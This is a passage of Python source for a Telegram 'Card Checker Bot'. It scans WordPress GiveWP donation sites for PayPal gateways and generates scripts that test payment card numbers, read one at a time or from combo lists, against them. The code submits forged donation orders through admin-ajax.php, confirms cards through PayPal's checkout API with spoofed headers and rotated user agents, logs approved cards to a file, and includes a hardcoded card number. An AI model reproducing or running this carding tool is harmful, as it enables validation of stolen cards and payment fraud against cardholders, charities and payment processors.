            'give-form-hash': self.nonec,
            'give-price-id': price_id,
            'give-recurring-logged-in-only': '',
            'give-logged-in-only': '1',
            '_give_is_donation_recurring': '0',
            'give_recurring_donation_details': '{{"give_recurring_option":"yes_donor"}}',
            'give-amount': amount,
            'give_stripe_payment_method': '',
            'payment-mode': 'paypal-commerce',
            'give_first': random.choice(self.first_name),
            'give_last': random.choice(self.last_name),
            'give_email': self.email,
            'card_name': 'Test Bot',
            'card_exp_month': '',
            'card_exp_year': '',
            'give-gateway': 'paypal-commerce',
        }}

    def _create_order_smart(self):
        attempts = [
            (self.minimum_amount, 'custom'),
            (self.minimum_amount, self.working_price_id),
            ('', '3'),
            ('', self.working_price_id),
            ('5.00', 'custom'),
            ('', 'custom'),
        ]
        seen = set()
        unique = []
        for a in attempts:
            if a not in seen:
                seen.add(a)
                unique.append(a)

        headers = {{
            'user-agent': self.uu.random,
            'accept': 'application/json, text/javascript, */*; q=0.01',
            'x-requested-with': 'XMLHttpRequest',
            'origin': f'https://{{self.url}}',
            'referer': f'https://{{self.url}}{{self.inurl}}',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        }}
        actions = ['give_paypal_commerce_create_order', 'give_create_order', 'create_order']

        for amount, price_id in unique:
            form_data = self._get_base_form(amount, price_id)
            for action in actions:
                params = {{'action': action}}
                try:
                    response = self.r.post(f'https://{{self.url}}/wp-admin/admin-ajax.php', params=params, headers=headers, data=form_data, timeout=15)
                    if response.status_code == 200 and response.text:
                        try:
                            json_data = response.json()
                            if 'data' in json_data:
                                if isinstance(json_data['data'], dict) and 'id' in json_data['data']:
                                    return json_data['data']['id'], amount, price_id
                                elif isinstance(json_data['data'], str):
                                    return json_data['data'], amount, price_id
                            if 'id' in json_data:
                                return json_data['id'], amount, price_id
                        except:
                            pass
                except:
                    continue
            time.sleep(1.5)
        return None, None, None

    def _confirm_card(self, order_id, n, mm, yy, cvc):
        expiry = f'20{{yy}}-{{mm}}'
        auth_tokens = [self.au, self.client_id]
        for auth_token in auth_tokens:
            if not auth_token:
                continue
            he4 = {{
                'authority': 'cors.api.paypal.com',
                'accept': '*/*',
                'authorization': f'Bearer {{auth_token}}',
                'braintree-sdk-version': BRAINTREE_SDK,
                'content-type': 'application/json',
                'origin': 'https://assets.braintreegateway.com',
                'paypal-client-metadata-id': PAYPAL_METADATA_ID,
                'referer': 'https://assets.braintreegateway.com/',
                'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-platform': '"Android"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'cross-site',
                'user-agent': self.uu.random,
            }}
            da3 = {{
                'payment_source': {{
                    'card': {{
                        'number': n,
                        'expiry': expiry,
                        'security_code': cvc,
                        'attributes': {{'verification': {{'method': 'SCA_WHEN_REQUIRED'}}}},
                    }}
                }},
                'application_context': {{'vault': False}},
            }}
            try:
                confirm_res = self.r.post(
                    f'https://cors.api.paypal.com/v2/checkout/orders/{{order_id}}/confirm-payment-source',
                    headers=he4, json=da3, timeout=15
                )
                text = confirm_res.text
                if confirm_res.status_code == 200:
                    try:
                        js = confirm_res.json()
                        if isinstance(js, dict):
                            if 'details' in js and len(js['details']) > 0:
                                issue = js['details'][0].get('issue', '')
                                desc = js['details'][0].get('description', '')
                                if issue:
                                    if issue == 'ORDER_NOT_APPROVED':
                                        return "Payer cannot pay for this transaction."
                                    if desc:
                                        return f"{{issue}}: {{desc}}"
                                    return issue
                    except:
                        pass
                    return None
                if confirm_res.status_code in (400, 422):
                    try:
                        js = confirm_res.json()
                        if isinstance(js, dict) and 'details' in js and len(js['details']) > 0:
                            issue = js['details'][0].get('issue', '')
                            desc = js['details'][0].get('description', '')
                            if issue:
                                if issue == 'ORDER_NOT_APPROVED':
                                    return "Payer cannot pay for this transaction."
                                if desc:
                                    return f"{{issue}}: {{desc}}"
                                return issue
                    except:
                        pass
                    issue_matches = re.findall(r'"issue"\\s*:\\s*"([^"]+)"', text)
                    if issue_matches:
                        issue = issue_matches[0]
                        if issue == 'ORDER_NOT_APPROVED':
                            return "Payer cannot pay for this transaction."
                        return issue
            except:
                continue
        return None

    def _approve_order(self, order_id, amount, price_id):
        form_data = self._get_base_form(amount, price_id)
        headers = {{
            'user-agent': self.uu.random,
            'accept': 'application/json, text/javascript, */*; q=0.01',
            'x-requested-with': 'XMLHttpRequest',
            'origin': f'https://{{self.url}}',
            'referer': f'https://{{self.url}}{{self.inurl}}',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        }}
        actions = ['give_paypal_commerce_approve_order', 'give_approve_order', 'approve_order']
        for action in actions:
            params = {{'action': action, 'order': order_id}}
            try:
                response = self.r.post(f'https://{{self.url}}/wp-admin/admin-ajax.php', params=params, headers=headers, data=form_data, timeout=15)
                if response.status_code == 200:
                    return response
            except:
                continue
        return None

    def _clean_response(self, text):
        if not text:
            return "DECLINED"
        text_strip = text.strip()
        if '<!DOCTYPE' in text_strip.upper() or '<html' in text_strip.upper():
            return "DECLINED"
        try:
            js = json.loads(text_strip)
            if isinstance(js, dict):
                success = js.get('success')
                if success is True:
                    return 'CHARGE 1.0'
                if success is False:
                    err = json.dumps(js.get('data', {{}}), ensure_ascii=False).upper()
                    for pr in ['INSUFFICIENT_FUNDS', 'PAYER_CANNOT_PAY', 'ORDER_NOT_APPROVED',
                               'DO_NOT_HONOR', 'GENERIC_DECLINE', 'EXPIRED_CARD',
                               'CVV2_FAILURE', 'SUSPECTED_FRAUD']:
                        if pr in err:
                            if pr == 'ORDER_NOT_APPROVED':
                                return "Payer cannot pay for this transaction."
                            return pr
                    return "DECLINED"
        except:
            pass
        for pr in ['INSUFFICIENT_FUNDS', 'PAYER_CANNOT_PAY', 'ORDER_NOT_APPROVED',
                   'DO_NOT_HONOR', 'GENERIC_DECLINE', 'EXPIRED_CARD',
                   'CVV2_FAILURE', 'SUSPECTED_FRAUD', 'RESTRICTED_OR_INACTIVE_ACCOUNT']:
            if pr in text_strip.upper():
                if pr == 'ORDER_NOT_APPROVED':
                    return "Payer cannot pay for this transaction."
                return pr
        return text_strip[:200]

    def Charge(self, ccx):
        self.checked += 1
        ccx = ccx.strip()
        n = ccx.split("|")[0]
        mm = ccx.split("|")[1]
        yy = ccx.split("|")[2]
        cvc = ccx.split("|")[3].strip()
        if "20" in yy:
            yy = yy.split("20")[1]

        try:
            order_id, amount, price_id = self._create_order_smart()
            if not order_id:
                return "Create Order Failed"

            confirm_result = self._confirm_card(order_id, n, mm, yy, cvc)
            if confirm_result:
                return confirm_result

            approve_res = self._approve_order(order_id, amount, price_id)
            if approve_res:
                return self._clean_response(approve_res.text)

            return "DECLINED"
        except Exception as e:
            return f"Error: {{e}}"

if __name__ == '__main__':
    Getat = 'PayPal Custom 1$'
    print(f'Cheker {{Getat}}')
    Br = input('Enter Numer (Manual : 1 - Combo : 2) : ')
    if Br == '1':
        while True:
            ar = input('Enter Card ( n | mm | yy | cvc ): ')
            rr = PayPal()
            resulti = rr.Charge(ar)
            if 'CHARGE' in resulti or 'INSUFFICIENT_FUNDS' in resulti:
                with open('Approved Card.txt', "a") as f:
                    f.write(ar + f': {{resulti}} > {{Getat}}\\n')
            print('Response: ' + resulti)
            time.sleep(5)
    else:
        noy = 0
        cr = input('Enter Name Combo: ')
        with open(cr, "r") as f:
            crads = f.read().splitlines()
            for P in crads:
                noy += 1
                try:
                    rr = PayPal()
                    resulti = rr.Charge(P)
                except Exception as e:
                    resulti = f'Error {{e}}'
                if 'CHARGE' in resulti or 'INSUFFICIENT_FUNDS' in resulti:
                    with open('Approved Card.txt', "a") as f:
                        f.write(P + f': {{resulti}} > {{Getat}}\\n')
                print(f'[{{noy}}] ' + P + '  >>  ' + resulti)
                time.sleep(13)
'''


# ═══════════════════════════════════════════════════════════════
# check_single_link
# ═══════════════════════════════════════════════════════════════
def check_single_link(link):
    paypal = None
    try:
        if not link.startswith(("http://", "https://")):
            return {'link': link, 'live': False, 'respons': 'Invalid URL', 'amount': None}

        # 1. استخراج بـ Playwright
        extracted = extract_gateway(link)

        # 2. الدفع بـ PayPalCommerce
        paypal = PayPalCommerce(target_url=link, extracted=extracted)
        result = paypal.Charge('4059986126444431|11|30|947')

        is_live = False
        for pr in PAYPAL_RESPONSES:
            if pr.lower() in result.lower():
                is_live = True
                break

        for dr in DEAD_RESPONSES:
            if dr.lower() in result.lower():
                return {'link': link, 'live': False, 'respons': result, 'amount': None}

        if is_live:
            return {
                'link': link,
                'live': True,
                'respons': result,
                'amount': paypal.working_amount or paypal.minimum_amount,
                'id_form1': paypal.form_id_prefix or '',
                'id_form2': paypal.form_id or '',
                'nonec': paypal.nonce or '',
                'au': paypal.client_token or paypal.access_token or '',
            }

        return {'link': link, 'live': False, 'respons': result, 'amount': None}

    except Exception as e:
        return {'link': link, 'live': False, 'respons': str(e)[:100], 'amount': None}
    finally:
        if paypal and hasattr(paypal, 'r'):
            try:
                paypal.r.close()
            except:
                pass


# ═══════════════════════════════════════════════════════════════
# /paypal command
# ═══════════════════════════════════════════════════════════════
@bot.message_handler(func=lambda m: m.text.lower().startswith('/paypal'))
def ali_al2(massege):
    with open("blockusers.txt", "r") as file:
        blocked = file.read().splitlines()
    if str(massege.from_user.id) in blocked:
        safe_send_message(massege.chat.id, 'The admin has blocked you.')
        return

    ko = safe_send_message(massege.chat.id, "- The gate is being withdrawn ...")
    if not ko:
        return

    try:
        parts = massege.text.split(maxsplit=1)
        if len(parts) != 2:
            safe_edit_message(massege.chat.id, ko.message_id, '- Please send the link like this:\n\n<code>/paypal https://xxxxxxx.xxx/xxxx</code>')
            return

        link = parts[1].strip()

        if not link.startswith(("http://", "https://")):
            safe_edit_message(massege.chat.id, ko.message_id, "Invalid link format ❌")
            return

        r = requests.get(link, headers={"User-Agent": "Mozilla/5.0"}, timeout=10, verify=False)
        if r.status_code != 200:
            safe_edit_message(massege.chat.id, ko.message_id, f"Site returned status: {r.status_code} ❌")
            return

        safe_edit_message(massege.chat.id, ko.message_id, "Gate found ✅")
    except:
        pass

    try:
        # 1. Playwright extract
        extracted = extract_gateway(link)

        # 2. PayPalCommerce charge
        paypal = PayPalCommerce(target_url=link, extracted=extracted)
        result = paypal.Charge('4059986126444431|11|30|947')

        is_live = False
        for pr in PAYPAL_RESPONSES:
            if pr.lower() in result.lower():
                is_live = True
                break

        for dr in DEAD_RESPONSES:
            if dr.lower() in result.lower():
                safe_edit_message(massege.chat.id, ko.message_id, f"❌ <b>Dead:</b> <code>{link}</code>\n📝 <b>Response:</b> {result}")
                paypal.r.close()
                return

        if not is_live:
            safe_edit_message(massege.chat.id, ko.message_id, f"❌ <b>Dead:</b> <code>{link}</code>\n📝 <b>Response:</b> {result}")
            paypal.r.close()
            return

        # 3. gate file
        file_name = f'gateway_{int(time.time())}.py'
        with open(file_name, "w", encoding="utf-8") as f:
            f.write(generate_gateway_code(result, link, paypal))

        amount_display = paypal.working_amount or paypal.minimum_amount or '1.00'

        safe_send_document(massege.chat.id, file_name, caption=f'''✅ <b>Live Gateway Found!</b>
━━━━━━━━━━━━━━━━━━━━
🔗 Link: <code>{link}</code>
━━━━━━━━━━━━━━━━━━━━
💬 <b>Response:</b> <code>{result}</code>
💰 <b>Amount:</b> <code>${amount_display}</code>
━━━━━━━━━━━━━━━━━━━━
Dev: @FAWZY30''')
        os.remove(file_name)
        paypal.r.close()

    except Exception as e:
        print(f"Error in ali_al2: {e}")
        if 'paypal' in locals():
            try:
                paypal.r.close()
            except:
                pass


# ═══════════════════════════════════════════════════════════════
# /mass command
# ═══════════════════════════════════════════════════════════════
@bot.message_handler(commands=['mass'])
def mass_extract_start(message):
    with open("blockusers.txt", "r") as file:
        blocked = file.read().splitlines()
    if str(message.from_user.id) in blocked:
        safe_send_message(message.chat.id, 'The admin has blocked you.')
        return

    msg = safe_send_message(message.chat.id, "📁 Send a .txt file with links (one link per line):")
    if msg:
        bot.register_next_step_handler(msg, process_mass_file)


@bot.message_handler(commands=['stop'])
def stop_mass(message):
    user_id = message.from_user.id
    if user_id in processing_status:
        processing_status[user_id]['stop_flag'] = True
        safe_send_message(message.chat.id, "🛑 Stopping...")
    else:
        safe_send_message(message.chat.id, "❌ No active process.")


def process_mass_file(message):
    if not message.document:
        safe_send_message(message.chat.id, "❌ Please send a .txt file.")
        return

    try:
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        links = downloaded_file.decode('utf-8', errors='ignore').splitlines()
        links = [link.strip() for link in links if link.strip()]

        if not links:
            safe_send_message(message.chat.id, "❌ File is empty.")
            return

        total = len(links)
        user_id = message.from_user.id
        chat_id = message.chat.id

        processing_status[user_id] = {
            'total': total, 'processed': 0, 'live': 0, 'dead': 0,
            'lock': threading.Lock(), 'current_url': '', 'current_respons': '',
            'stop_flag': False, 'done': False
        }

        status_msg = safe_send_message(chat_id, f"""📊 <b>File #1 - Scanning links...</b>
━━━━━━━━━━━━━━━━━━
📌 Total Links: {total}
✅ Live: 0
❌ Dead: 0
⏳ Progress: 0% ░░░░░░░░░░░░░░░░░░░░
Url : ...
Respons : ...
━━━━━━━━━━━━━━━━━━
⏱️ Checked 0 of {total}
🛑 /stop to stop""")

        if not status_msg:
            return

        def update_status():
            last_text = ""
            while True:
                time.sleep(10)
                try:
                    with processing_status[user_id]['lock']:
                        if processing_status[user_id].get('done', False):
                            break
                        processed = processing_status[user_id]['processed']
                        live = processing_status[user_id]['live']
                        dead = processing_status[user_id]['dead']
                        current_url = processing_status[user_id]['current_url']
                        current_respons = processing_status[user_id]['current_respons']
                        percent = int((processed / total) * 100) if total > 0 else 0
                        bar_length = 20
                        filled = int((percent / 100) * bar_length)
                        bar = '█' * filled + '░' * (bar_length - filled)
                        text = f"""📊 <b>File #1 - Scanning links...</b>
━━━━━━━━━━━━━━━━━━
📌 Total Links: {total}
✅ Live: {live}
❌ Dead: {dead}
⏳ Progress: {percent}% {bar}
Url : <code>{current_url[:60] if current_url else '...'}</code>
Respons : <code>{current_respons[:60] if current_respons else '...'}</code>
━━━━━━━━━━━━━━━━━━
⏱️ Checked {processed} of {total}
🛑 /stop to stop"""

                        if text != last_text:
                            try:
                                bot.edit_message_text(text, chat_id, status_msg.message_id, parse_mode="HTML")
                                last_text = text
                            except:
                                pass
                except:
                    pass

        updater = threading.Thread(target=update_status, daemon=True)
        updater.start()

        time.sleep(2)

        for idx, link in enumerate(links):
            if processing_status[user_id].get('stop_flag', False):
                break

            with processing_status[user_id]['lock']:
                processing_status[user_id]['current_url'] = link
                processing_status[user_id]['current_respons'] = 'Checking...'

            result = check_single_link(link)

            with processing_status[user_id]['lock']:
                processing_status[user_id]['processed'] += 1
                if result and result.get('live'):
                    processing_status[user_id]['live'] += 1
                    live_idx = processing_status[user_id]['live']
                    processing_status[user_id]['current_respons'] = result['respons']

                    try:
                        code = generate_gateway_code(result['respons'], result['link'])
                        file_name = f'gateway_{live_idx}.py'
                        with open(file_name, 'w', encoding='utf-8') as f:
                            f.write(code)

                        amount_display = result.get('amount', '1.00') or '1.00'

                        safe_send_document(chat_id, file_name, caption=f"""✅ <b>Live Gateway #{live_idx}</b>
━━━━━━━━━━━━━━━━━━━━
🔗 Link: <code>{result['link']}</code>
━━━━━━━━━━━━━━━━━━━━
💬 <b>Response:</b> <code>{result['respons']}</code>
💰 <b>Amount:</b> <code>${amount_display}</code>
━━━━━━━━━━━━━━━━━━━━
Dev: @FAWZY30""")

                        try:
                            os.remove(file_name)
                        except:
                            pass
                    except Exception as e:
                        print(f"Error sending file: {e}")
                else:
                    processing_status[user_id]['dead'] += 1
                    processing_status[user_id]['current_respons'] = result.get('respons', 'Dead') if result else 'Dead'

            time.sleep(2)

        with processing_status[user_id]['lock']:
            processing_status[user_id]['done'] = True
            processed = processing_status[user_id]['processed']
            live = processing_status[user_id]['live']
            dead = processing_status[user_id]['dead']

        updater.join(timeout=2)

        final_text = f"""📊 <b>✅ Complete!</b>
━━━━━━━━━━━━━━━━━━
📌 Total Links: {total}
✅ Live (Sent): {live}
❌ Dead: {dead}
💯 Success Rate: {int((live/total)*100) if total > 0 else 0}%
━━━━━━━━━━━━━━━━━━
Dev: @FAWZY30"""

        try:
            safe_edit_message(chat_id, status_msg.message_id, final_text)
        except:
            safe_send_message(chat_id, final_text)

        if user_id in processing_status:
            del processing_status[user_id]

    except Exception as e:
        safe_send_message(message.chat.id, f"❌ Error: {str(e)[:100]}")


# ═══════════════════════════════════════════════════════════════
# START + FEEDBACK + BLOCK
# ═══════════════════════════════════════════════════════════════
@bot.message_handler(commands=["start"])
def start(message):
    with open("blockusers.txt", "r") as file:
        blocked = file.read().splitlines()
    if str(message.from_user.id) in blocked:
        safe_send_message(message.chat.id, 'The admin has blocked you due to your negative behavior.')
        return

    user_id = message.from_user.id
    userr = message.from_user.first_name
    username = message.from_user.username or "No Username"

    IU = f'''[⚡] 𝐖𝐞𝐥𝐜𝐨𝐦𝐞 𝐓𝐨 𝐂𝐚𝐫𝐝 𝐂𝐡𝐞𝐜𝐤𝐞𝐫 𝐁𝐨𝐭 🌟
[⚡] 𝐍𝐚𝐦𝐞: {userr}
[⚡] 𝐔𝐬𝐞𝐫𝐧𝐚𝐦𝐞: @{username}
[⚡] 𝐈𝐃: <code>{user_id}</code>
- - - - - - - - - - - - - - - - - - - - - -
[⚡] PayPal Gateway >> /paypal
[⚡] Mass Extract >> /mass
[⚡] Send Feedback >> Button Below
- - - - - - - - - - - - - - - - - - - - - -
[⚡] 𝐁𝐨𝐭 𝐁𝐲: @FAWZY30
[⚡] 𝐃𝐞𝐯 𝐁𝐲: Wafa.'''

    FRA = types.InlineKeyboardMarkup(row_width=2)
    Yes22 = types.InlineKeyboardButton('Submit Feedback to Owner', callback_data='yrr')
    FRA.add(Yes22)

    safe_send_message(message.chat.id, IU, reply_markup=FRA)


@bot.callback_query_handler(func=lambda call: call.data == 'yrr')
def feedback(call):
    user_id = call.from_user.id
    userr = call.from_user.first_name
    Atty = types.InlineKeyboardMarkup(row_width=1)
    back = types.InlineKeyboardButton("Back", callback_data="start")
    Atty.add(back)
    YTT = f'Welcome {userr} Send your message and the admin will respond.'
    try:
        bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text=YTT, parse_mode='HTML', reply_markup=Atty)
    except Exception as e:
        print(f"Feedback error: {e}")
    waiting_users[user_id] = True


@bot.message_handler(func=lambda m: m.from_user.id in waiting_users)
def get_user_msg(message):
    user_id = message.from_user.id
    name = message.from_user.first_name
    kb = types.InlineKeyboardMarkup()
    kb.add(types.InlineKeyboardButton("Reply", callback_data=f"reply_{user_id}"))
    safe_send_message(OWNER_ID, f"New Message\n\nFrom: {name}\nID: {user_id}\nMessage: {message.text}", reply_markup=kb)
    kb2 = types.InlineKeyboardMarkup()
    kb2.add(types.InlineKeyboardButton("Send another message", callback_data="yrr"))
    safe_send_message(user_id, "Your message has been sent.", reply_markup=kb2)
    waiting_users.pop(user_id)


@bot.callback_query_handler(func=lambda call: call.data.startswith("reply_"))
def start_reply(call):
    user_id = int(call.data.split("_")[1])
    reply_mode[call.from_user.id] = user_id
    safe_send_message(call.from_user.id, "Write your reply now:")


@bot.message_handler(func=lambda m: m.from_user.id == OWNER_ID and m.from_user.id in reply_mode)
def send_reply(message):
    user_id = reply_mode[message.from_user.id]
    safe_send_message(user_id, f"Admin response:\n\n{message.text}")
    safe_send_message(OWNER_ID, "Reply sent.")
    reply_mode.pop(message.from_user.id)


@bot.callback_query_handler(func=lambda call: call.data == "start")
def back_to_start(call):
    user_id = call.from_user.id
    userr = call.from_user.first_name
    username = call.from_user.username or "No Username"
    IU = f'[⚡] 𝐖𝐞𝐥𝐜𝐨𝐦𝐞 𝐓𝐨 𝐂𝐚𝐫𝐝 𝐂𝐡𝐞𝐜𝐤𝐞𝐫 𝐁𝐨𝐭 🌟\n[⚡] 𝐍𝐚𝐦𝐞: {userr}\n[⚡] 𝐔𝐬𝐞𝐫𝐧𝐚𝐦𝐞: @{username}\n[⚡] 𝐈𝐃: <code>{user_id}</code>'
    FRA = types.InlineKeyboardMarkup(row_width=2)
    Yes22 = types.InlineKeyboardButton('Submit Feedback to Owner', callback_data='yrr')
    FRA.add(Yes22)
    try:
        bot.edit_message_text(IU, call.message.chat.id, call.message.message_id, parse_mode='HTML', reply_markup=FRA)
    except Exception as e:
        print(f"Back error: {e}")


@bot.message_handler(commands=['block2'])
def block_user(message):
    if str(message.from_user.id) not in admins:
        safe_send_message(message.chat.id, "You do not have permission.")
        return
    try:
        user_id_to_block = message.text.split()[1]
        with open('blockusers.txt', 'a') as file:
            file.write(f"{user_id_to_block}\n")
        safe_send_message(message.chat.id, f"✅ User ID {user_id_to_block} blocked.")
    except:
        safe_send_message(message.chat.id, "Usage: /block2 [user_id]")


@bot.message_handler(commands=['unblock2'])
def unblock_user(message):
    if str(message.from_user.id) not in admins:
        safe_send_message(message.chat.id, "You do not have permission.")
        return
    try:
        user_id_to_unblock = message.text.split()[1]
        with open('blockusers.txt', 'r') as file:
            lines = file.readlines()
        with open('blockusers.txt', 'w') as file:
            for line in lines:
                if line.strip() != user_id_to_unblock:
                    file.write(line)
        safe_send_message(message.chat.id, f"✅ User ID {user_id_to_unblock} unblocked.")
    except:
        safe_send_message(message.chat.id, "Usage: /unblock2 [user_id]")


# ═══════════════════════════════════════════════════════════════
# MAIN POLLING
# ═══════════════════════════════════════════════════════════════
print('✅ Bot is running...')
try:
    bot.infinity_polling(none_stop=True, interval=0, timeout=60, long_polling_timeout=60)
except Exception as e:
    print(f'❌ Error: {e}')
